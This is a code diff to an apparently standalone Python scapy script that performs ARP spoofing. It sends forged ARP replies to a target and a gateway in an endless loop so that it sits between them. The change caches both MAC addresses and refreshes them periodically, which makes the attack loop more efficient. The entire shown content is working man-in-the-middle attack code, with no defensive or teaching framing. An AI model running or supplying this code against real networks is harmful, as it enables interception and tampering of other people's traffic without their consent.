@@ -84,7 +84,7 @@ def getMAC(ip):
     return resultList[0][1].hwsrc                                           # Returning the MAC address extracted from the response
 
 
-def spoof(targetIP, spoofIP):
+def spoof(targetIP, spoofIP, targetMAC):
     """ 
     Function to spoof the ARP table of the target device
 
@@ -98,7 +98,6 @@ def spoof(targetIP, spoofIP):
     Raises:
         None
     """
-    targetMAC = getMAC(targetIP)
     # Creating the ARP response packet to send to the target device
     packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
     scapy.send(packet, verbose=False)
@@ -134,11 +133,19 @@ def main():
     targetIP = options.target
     gatewayIP = options.gateway
     packetsCount = 0
+    macResetTimer = 0
+    targetMAC = getMAC(targetIP)
+    gatewayMAC = getMAC(gatewayIP)
     try:
         while True:
-            spoof(targetIP, gatewayIP)
-            spoof(gatewayIP, targetIP)
+            if macResetTimer == 600:
+                targetMAC = getMAC(targetIP)
+                gatewayMAC = getMAC(gatewayIP)
+                macResetTimer = 0
+            spoof(targetIP, gatewayIP, targetMAC)
+            spoof(gatewayIP, targetIP, gatewayMAC)
             packetsCount = packetsCount + 2
+            macResetTimer = macResetTimer + 2
             print(f"\r\033[92m[+] Packets sent:  {packetsCount}\033[0m", end="")
             time.sleep(2)
     except KeyboardInterrupt:
